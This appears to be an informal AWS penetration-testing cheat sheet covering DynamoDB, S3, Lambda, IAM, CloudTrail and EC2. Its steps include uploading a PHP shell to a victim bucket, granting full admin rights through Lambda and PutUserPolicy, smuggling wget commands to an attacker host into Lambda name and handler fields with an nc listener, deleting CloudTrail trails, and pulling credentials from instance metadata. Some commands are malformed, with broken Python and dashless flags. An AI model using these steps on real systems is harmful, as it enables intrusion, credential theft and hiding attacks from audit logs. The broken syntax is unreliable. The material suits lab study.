apt install awscli


#If you launch it the first time you will be asked for a few things 
AWS Access Key ID: simon
AWS Secret Access Key: simon
AWS region name: us-east-1
Default output format[None]:  #leave it blank

dynamodb
Aws –endpoint-url http://<victim_ip> dynamodb  list-tables
Aws –endpoint-url http://<victim_ip> dynamodb –table-name <table_name>

s3

listing all buckets
aws s3api list-buckets

getting information about the specific buckets
aws s3api get-bucket-acl --bucket name

listing all objects in a specified bucket
aws s3api list-objects --bucket name

Aws –endpoint-url http://<victim_ip> s3 ls #this will give your location
Aws –endpoint-url http://<vicitm_ip> s3 cp shell.php s3://<result_from_above>

#And now you uploaded a malicious file

lambda
listing all lambda functions
aws lambda list-functions

information about specific lambda function
aws lambda get-function --function-name function_name

listing rest-apis
aws apigateway get-rest-apis

listing information about the endpoint
aws apigateway get-resources --rest-api-id ID

listing API keys
aws apigateway get-api-keys --include-values

information about specific API key
aws apigateway get-api-key --api-key KEY

create a lambda function to change lambda role to admin then the user to Administrator


create file my-function.py
import boto3
import json

def handler(event,context)
	iam = boto3.client("iam")
	iam.attach.role.policy(RoleName="name",PolicyArn="arn",)
	iam.attach.user.policy(UserName="name",PolicyArn="arn",)
	return {
		'statusCode':200
		'body':json.dumps("Pwned")
	}

zip my-function.py my-function.zip

attach to the user
aws lambda create-function --function-name my-function --runtime python3.7 --zip-file fileb://my-function.zip --handler my-function.handler --role ARN --region region
invoke the function
aws lambda invoke --function-name my-function response.json --region region 
check if it worked
aws iam list-attached-user-policies --user-name user_name

                        or

nano index.js
exports.handler= async function(event,context)
{
return simonella
}
zip index.zip index.js

aws –endpoint-url http://<victim_ip> lambda create-function \
–function-name ‘test’ \
–zip-file fileb://index.zip \
–role DoesNotMatter \
–handler index.handler \
–runtime nodejs10.x 

aws –endpoint-url http://<vitim_ip> lambda invoke –function-name test output

cat output #if you get the simonells then you can proceed 

aws –endpoint-url http://<victim_ip> lambda create-function \
–function-name ‘test;wget <attacker_ip>’ \
–zip-file fileb://index.zip \
–role DoesNotMatter \
–handler index.handler \
–runtime nodejs10.x 

#on your terminal

nc -nlvp 80 
#if vulnerable you will get a connection


                        or
aws –endpoint-url http://<victim_ip> lambda create-function \
–function-name ‘test’ \
–zip-file fileb://index.zip \
–role DoesNotMatter \
–handler ‘$(wget <attacker_ip/`whoami`) \
–runtime nodejs10.x 

nc -nlvp 80 
#if vulnerable you will get a connection

IAM

listing IAM users
aws iam list-users

listing IAM groups
aws iam list-group

listing IAM roles
aws iam list-roles

listing IAM policies
aws iam list-policies

listing IAM access keys
aws iam list-access-keys

checking for stored credentials 
aws sts get-caller-identity

list policies attached to the user
aws iam list-attached-user-policies --user-name <username> -- profile example_profile

If we have the PutUserPolicy is enabled, we can add an inline administrator policy to our user.

create AdminPolicy.json file

{
	"Version": "2021-10-17",
	"Statement" : [
		{
			"Effect":"Allow",
			"Action": [
				"*"
			],
			"Resource":[
				"*"
			]
		}
	]
}

attach this policy into the user

aws iam put-user-policy --user-name <username> --policy-name example_name --policy-document file://AdminPolicy.json

AWS secret manager

listing secret
aws secretsmanager list-secrets

listing keys
aws kms list-keys

Beanstalk
you can retrieve accountID/region/AccessKeyID/SecretAccessKey/Token from the API

http://<vicitm_ip>/latest/dynamic/instance-identity/document
http://<victim_ip>/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role

CLoudTrail
To disable logging

aws cloudtrail delete-trail --name cloudgoat_trail --profile administrator

$ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event 
$ aws cloudtrail update-trail --name cloudgoat_trail --no-include-global-service-event --no-is-multi-region --region=eu-west

EC2
to grab metadata
curl http://169.254.169.254/latest/meta-data

grabbing the keys to access instance
curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance

TOKEN=`curl
X PUT "http://169.254.169.254/latest/ api /token" H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
&& curl H "X-aws-ec2-metadata-token: $TOKEN" v http://169.254.169.254/latest/meta-data/


to grab user data

curl http://169.254.169.254/latest/user-data/

TOKEN=`curl
X PUT "http://169.254.169.254/latest/ api /token" H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
&& curl H "X-aws-ec2-metadata-token: $TOKEN" v http://169.254.169.254/latest/user-data/

